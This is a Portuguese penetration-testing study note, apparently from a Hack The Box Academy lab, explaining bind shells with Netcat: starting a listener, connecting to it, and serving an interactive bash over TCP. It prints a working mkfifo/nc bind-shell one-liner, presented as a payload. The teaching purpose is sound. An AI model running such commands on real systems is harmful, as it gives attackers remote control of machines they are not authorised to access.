Em muitos casos, trabalharemos para estabelecer um shell em um sistema em uma rede local ou remota. Isso significa que buscaremos usar o aplicativo emulador de terminal em nossa caixa de ataque local para controlar o sistema remoto por meio de seu shell. Isso normalmente é feito usando um shell `Bind`&/or `Reverse`.

## O que é?

Com um bind shell, o `target`sistema inicia um listener e aguarda uma conexão do sistema de um pentester (caixa de ataque).

#### Exemplo de ligação
![[Pasted image 20240828092037.png]]

Como visto na imagem, nos conectaríamos diretamente com o `IP address`e `port`escutaríamos no alvo. Pode haver muitos desafios associados a obter um shell dessa forma. Aqui estão alguns a serem considerados:

- Teria que haver um ouvinte já iniciado no alvo.
- Se não houver nenhum ouvinte iniciado, precisaremos encontrar uma maneira de fazer isso acontecer.
- Os administradores normalmente configuram regras rígidas de firewall de entrada e NAT (com implementação de PAT) na borda da rede (voltada para o público), então precisaríamos estar na rede interna.
- Os firewalls do sistema operacional (no Windows e Linux) provavelmente bloquearão a maioria das conexões de entrada que não estejam associadas a aplicativos confiáveis ​​baseados em rede.

Firewalls de SO podem ser problemáticos ao estabelecer um shell, pois precisamos considerar endereços IP, portas e a ferramenta em uso para fazer nossa conexão funcionar com sucesso. No exemplo acima, o aplicativo usado para iniciar o listener é chamado [GNU Netcat](https://en.wikipedia.org/wiki/Netcat) .

`Netcat`( `nc`) é considerado nosso, `Swiss-Army Knife`pois pode funcionar em soquetes TCP, UDP e Unix. Ele é capaz de usar IPv4 e IPv6, abrir e ouvir em soquetes, operar como um proxy e até mesmo lidar com entrada e saída de texto. Usaríamos nc na caixa de ataque como nosso `client`, e o alvo seria o `server`.

Vamos entender isso mais profundamente praticando com o Netcat e estabelecendo uma conexão de shell de ligação com um host na mesma rede, sem restrições.

## Praticando com GNU Netcat

Uma vez conectado à caixa de destino com ssh, inicie um ouvinte Netcat:

#### No. 1: Servidor - Alvo iniciando o ouvinte Netcat
```shell-session
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
```

Neste caso, o alvo será nosso servidor, e a caixa de ataque será nosso cliente. Assim que apertamos enter, o listener é iniciado e aguarda uma conexão do cliente.

De volta ao cliente (caixa de ataque), usaremos o nc para conectar ao ouvinte que iniciamos no servidor.

#### No. 2: Cliente - Caixa de ataque conectando ao alvo
```shell-session
NycolasES6@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

Observe como estamos usando nc no cliente e no servidor. No lado do cliente, especificamos o endereço IP do servidor e a porta que configuramos para escutar ( `7777`). Assim que conectarmos com sucesso, podemos ver uma `succeeded!`mensagem no cliente, como mostrado acima, e uma `received!`mensagem no servidor, como visto abaixo.

#### No. 3: Servidor - Alvo recebendo conexão do cliente
```shell-session
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!  
```

Saiba que este não é um shell propriamente dito. É apenas uma sessão TCP Netcat que estabelecemos. Podemos ver sua funcionalidade digitando uma mensagem simples no lado do cliente e visualizando-a recebida no lado do servidor.

#### No. 4: Cliente - Caixa de ataque enviando mensagem Olá Academia
```shell-session
NycolasES6@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy  
```

Depois de digitar a mensagem e pressionar Enter, notamos que a mensagem foi recebida no lado do servidor.

#### No. 5: Servidor - Alvo recebendo mensagem Hello Academy
```shell-session
Victim@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy 
```

## Estabelecendo um Bind Shell básico com Netcat

Agora vamos usar o Netcat para servir nosso shell para estabelecer um bind shell real.

No lado do servidor, precisaremos especificar que `directory`, `shell`, `listener`, trabalhe com alguns `pipelines`, e `input`& `output` `redirection`para garantir que um shell para o sistema seja servido quando o cliente tentar se conectar.

#### No. 1: Servidor - Vinculando um shell Bash à sessão TCP
```shell-session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

Os comandos acima são considerados nossa carga útil, e entregamos essa carga útil manualmente. Notaremos que os comandos e códigos em nossas cargas úteis serão diferentes dependendo do sistema operacional host para o qual estamos entregando.

De volta ao cliente, use o Netcat para se conectar ao servidor agora que um shell no servidor está sendo servido.

#### No. 2: Cliente - Conectando ao bind shell no alvo
```shell-session
NycolasES6@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$  
```


Em um cenário controlado, uma sessão de *bind shell* foi estabelecida com sucesso entre uma máquina de ataque e um sistema alvo. Esse exercício é importante para entender os conceitos básicos do *bind shell* e seu funcionamento sem a presença de medidas de segurança como firewalls e sistemas de detecção. No entanto, o *bind shell* é relativamente fácil de defender, pois a conexão é recebida como entrada, facilitando a detecção e bloqueio por firewalls. Para contornar essa limitação, o uso de um *reverse shell* é sugerido, tema que será discutido na próxima seção.













